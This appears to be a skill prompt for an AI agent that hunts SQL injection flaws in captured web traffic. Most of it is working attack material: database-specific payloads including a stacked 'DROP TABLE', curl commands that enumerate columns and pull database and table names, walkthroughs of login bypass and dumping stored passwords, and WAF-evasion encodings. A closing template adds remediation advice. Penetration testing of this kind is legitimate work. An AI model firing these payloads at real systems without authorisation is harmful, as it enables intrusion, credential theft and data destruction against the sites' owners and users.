---
description: Find SQL Injection vulnerabilities in captured traffic. Use when user asks about database security, injection attacks, or data extraction.
---

# Find SQL Injection Vulnerabilities

Analyze the mitmproxy dump (log.txt) for SQL injection vulnerabilities for: $ARGUMENTS

## High-Value SQLi Patterns (from 99 real HackerOne bounty reports)

### 1. Common Vulnerable Parameters
**Parameters frequently vulnerable to SQLi:**
```
id, user_id, product_id, order_id, item_id
search, query, q, keyword, term, filter
sort, order, orderby, sortby, column
category, cat, type, status, name
from, to, start, end, date, time
page, limit, offset, per_page
callback, jsonp, format
file, path, template, view
```

**Search patterns:**
```bash
grep -iE '(id|search|query|sort|order|filter|category|name|type)[=:]["'\'']?[^&"'\'']+' log.txt
```

### 2. Injection Points

#### URL Path Parameters
```
/api/users/123 → /api/users/123'
/products/category/electronics → /products/category/electronics'--
```

#### Query Parameters
```
?id=1 → ?id=1' OR '1'='1
?search=test → ?search=test' UNION SELECT--
?sort=name → ?sort=name;DROP TABLE--
```

#### Request Body (JSON)
```json
{"user_id": "1"} → {"user_id": "1' OR '1'='1"}
{"filter": {"name": "test"}} → {"filter": {"name": "test' OR '1'='1"}}
```

#### Headers
```
X-Forwarded-For: 127.0.0.1' OR '1'='1
Cookie: session=abc' UNION SELECT--
```

### 3. Database-Specific Payloads

#### MySQL
```sql
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
' AND SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

#### PostgreSQL
```sql
' OR '1'='1
'; SELECT pg_sleep(5)--
' UNION SELECT NULL,NULL,NULL--
```

#### MSSQL
```sql
' OR '1'='1
'; WAITFOR DELAY '0:0:5'--
' UNION SELECT NULL,NULL,NULL--
```

#### Oracle
```sql
' OR '1'='1
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' UNION SELECT NULL,NULL FROM DUAL--
```

## Detection Techniques

### Error-Based Detection
Look for database errors in responses:
```bash
grep -iE '(sql|mysql|oracle|postgres|sqlite|syntax error|query|database|ORA-|PG::|Microsoft SQL)' log.txt
```

### Time-Based Detection
Test with sleep payloads, measure response time:
```bash
# Baseline
time curl 'https://target.com/api/user?id=1'

# Test
time curl 'https://target.com/api/user?id=1%27%20AND%20SLEEP(5)--'
```

### Boolean-Based Detection
Compare responses:
```bash
# True condition
curl 'https://target.com/api/user?id=1%20AND%201=1'

# False condition
curl 'https://target.com/api/user?id=1%20AND%201=2'

# Different response = potentially vulnerable
```

### Union-Based Detection
```bash
# Find column count
curl 'https://target.com/api/search?q=test%27%20UNION%20SELECT%20NULL--'
curl 'https://target.com/api/search?q=test%27%20UNION%20SELECT%20NULL,NULL--'
curl 'https://target.com/api/search?q=test%27%20UNION%20SELECT%20NULL,NULL,NULL--'
```

## Severity Rating

| Type | Severity | Impact |
|------|----------|--------|
| Data extraction (UNION) | **CRITICAL** | Full database access |
| Authentication bypass | **CRITICAL** | Login without credentials |
| Blind SQLi (time-based) | **HIGH** | Slow data extraction |
| Error-based info disclosure | **MEDIUM** | Database structure leak |
| Limited injection (filtered) | **LOW** | Potential for escalation |

## Testing Methodology

### Step 1: Identify Input Points
```bash
# Find all parameters in traffic
grep -oE '[?&][a-zA-Z_]+=' log.txt | sort -u

# Find JSON body parameters
grep -oE '"[a-zA-Z_]+":' log.txt | sort -u
```

### Step 2: Test Basic Payloads
```bash
# Single quote test
curl 'https://target.com/api/item?id=1%27'

# Comment test
curl 'https://target.com/api/item?id=1--'

# Boolean test
curl 'https://target.com/api/item?id=1%20AND%201=1'
```

### Step 3: Identify Database Type
```bash
# MySQL
curl 'https://target.com/api/item?id=1%27%20AND%20@@version--'

# PostgreSQL
curl 'https://target.com/api/item?id=1%27%20AND%20version()--'

# MSSQL
curl 'https://target.com/api/item?id=1%27%20AND%20@@SERVERNAME--'
```

### Step 4: Extract Data (if vulnerable)
```bash
# Get database name
curl 'https://target.com/api/search?q=%27%20UNION%20SELECT%20database(),NULL,NULL--'

# Get table names
curl 'https://target.com/api/search?q=%27%20UNION%20SELECT%20table_name,NULL,NULL%20FROM%20information_schema.tables--'
```

## Real Attack Scenarios

### Scenario 1: Authentication Bypass
```
Login form: username=admin&password=xxx
Payload: username=admin'--&password=anything
Query becomes: SELECT * FROM users WHERE username='admin'--' AND password='anything'
Result: Logs in as admin without password
```

### Scenario 2: Data Extraction via UNION
```
Search: /api/search?q=test
Payload: /api/search?q=test' UNION SELECT username,password,email FROM users--
Query becomes: SELECT name,desc,price FROM products WHERE name='test' UNION SELECT username,password,email FROM users--
Result: Dumps user credentials
```

### Scenario 3: Blind SQLi Data Extraction
```
/api/user?id=1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
Response time or content difference reveals if first char is 'a'
Repeat for each character position
```

## WAF Bypass Techniques

### Encoding
```
' → %27 → %2527 (double encode)
UNION → UnIoN (case variation)
SELECT → /*!SELECT*/ (MySQL comment)
```

### Alternative Syntax
```
AND → &&
OR → ||
UNION SELECT → UNION ALL SELECT
' → "
```

### Comment Injection
```
/**/UNION/**/SELECT/**/
UN/**/ION/**/SE/**/LECT
```

## Output Format

```
## SQLi Finding: [Brief Description]

**Endpoint**: `METHOD https://target.com/path`
**Parameter**: `param_name` in [query|body|path|header]
**Database**: [MySQL|PostgreSQL|MSSQL|Oracle|Unknown]
**Type**: [Error-based|Union|Blind Boolean|Blind Time]
**Severity**: [CRITICAL|HIGH|MEDIUM|LOW]

**Evidence**:
[Request with payload and response showing vulnerability]

**Payload Used**:
```
' OR '1'='1
```

**Impact**:
- Database dump possible
- Authentication bypass
- Data modification/deletion

**Test Command**:
curl 'https://target.com/api/...?id=1%27%20OR%20%271%27=%271'

**Remediation**:
- Use parameterized queries / prepared statements
- Input validation and sanitization
- Least privilege database accounts
- WAF rules for SQLi patterns
```

## False Positives to Ignore

- Parameters that are client-side only
- Errors that don't reveal database info
- Rate-limited endpoints that block testing
- Parameters that only accept specific formats (UUID, numeric)
- GraphQL endpoints (different injection patterns)
